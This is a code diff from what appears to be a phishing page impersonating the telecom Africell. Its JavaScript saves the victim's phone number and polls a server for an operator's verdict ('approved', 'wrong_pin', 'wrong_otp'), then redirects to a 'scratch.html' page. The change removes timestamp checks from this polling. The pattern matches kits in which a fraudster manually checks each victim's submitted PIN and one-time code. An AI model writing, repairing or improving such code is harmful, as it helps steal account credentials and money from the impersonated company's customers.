@@ -149,10 +149,8 @@
 
         let phoneValue = '';
         let activeInterval = null;
-        const pageLoadTimestamp = Date.now();
 
         window.addEventListener('DOMContentLoaded', () => {
-            localStorage.removeItem('africellApprovalTimestamp');
             const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
             if (savedPhone) {
                 phoneValue = savedPhone.replace('+232', '').trim();
@@ -234,18 +232,17 @@
 
         function pollApprovalStatus(phone) {
             if (activeInterval) clearInterval(activeInterval);
-            const submissionTimestamp = Date.now();
 
             activeInterval = setInterval(async () => {
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone.trim())}&t=${Date.now()}`);
                     const data = await response.json();
 
-                    if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
+                    if (data.status === 'approved') {
                         clearInterval(activeInterval);
                         window.location.href = 'scratch.html';
                     } 
-                    else if ((data.status === 'rejected' || data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') && data.timestamp && data.timestamp >= submissionTimestamp) {
+                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
                         clearInterval(activeInterval);
                         showInlineError('⚠️ Incorrect phone number. Please try again.');
                         resetBtnState();
